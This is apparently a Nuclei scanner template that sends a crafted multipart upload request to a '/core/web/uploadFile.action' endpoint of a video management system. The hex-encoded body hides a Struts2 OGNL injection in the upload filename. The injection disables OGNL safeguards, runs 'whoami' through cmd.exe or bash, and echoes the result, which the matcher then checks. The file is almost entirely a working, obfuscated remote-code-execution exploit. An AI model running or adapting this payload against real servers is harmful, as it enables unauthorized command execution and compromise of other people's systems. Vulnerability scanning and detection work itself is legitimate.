id: video-system-core-rce

info:
  name: video-system-core-rce
  author: HackTwo
  severity: high

  description: |
    漏洞测试-RCE
  reference:
    - https://wx.zsxq.com/dweb2/index/group/88885811181452
  tags: auto

http:
  - raw:
      - |
        POST /core/web/uploadFile.action HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z
        Connection: close

        {{hex_decode("2d2d2d2d2d2d5765624b6974466f726d426f756e64617279416e6d556754456846684f5a7072397a0d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d22706f6366696c65223b2066696c656e616d653d22257b28236e696b653d276d756c7469706172742f666f726d2d6461746127292e2823646d3d406f676e6c2e4f676e6c436f6e746578744044454641554c545f4d454d4245525f414343455353292e28235f6d656d6265724163636573733f28235f6d656d6265724163636573733d23646d293a282823636f6e7461696e65723d23636f6e746578745b27636f6d2e6f70656e73796d70686f6e792e78776f726b322e416374696f6e436f6e746578742e636f6e7461696e6572275d292e28236f676e6c5574696c3d23636f6e7461696e65722e676574496e7374616e63652840636f6d2e6f70656e73796d70686f6e792e78776f726b322e6f676e6c2e4f676e6c5574696c40636c61737329292e28236f676e6c5574696c2e6765744578636c756465645061636b6167654e616d657328292e636c6561722829292e28236f676e6c5574696c2e6765744578636c75646564436c617373657328292e636c6561722829292e2823636f6e746578742e7365744d656d6265724163636573732823646d292929292e2823636d643d2777686f616d6927292e2823697377696e3d28406a6176612e6c616e672e53797374656d4067657450726f706572747928276f732e6e616d6527292e746f4c6f7765724361736528292e636f6e7461696e73282777696e272929292e2823636d64733d2823697377696e3f7b27636d642e657865272c272f63272c23636d647d3a7b272f62696e2f62617368272c272d63272c23636d647d29292e2823703d6e6577206a6176612e6c616e672e50726f636573734275696c6465722823636d647329292e2823702e72656469726563744572726f7253747265616d287472756529292e282370726f636573733d23702e73746172742829292e2823726f733d28406f72672e6170616368652e737472757473322e536572766c6574416374696f6e436f6e7465787440676574526573706f6e736528292e6765744f757470757453747265616d282929292e28406f72672e6170616368652e636f6d6d6f6e732e696f2e494f5574696c7340636f7079282370726f636573732e676574496e70757453747265616d28292c23726f7329292e2823726f732e666c7573682829297d0062220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a7464776566657777650d0a2d2d2d2d2d2d5765624b6974466f726d426f756e64617279416e6d556754456846684f5a7072397a2d2d0d0a0d0a0d0a")}}




    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"\\system")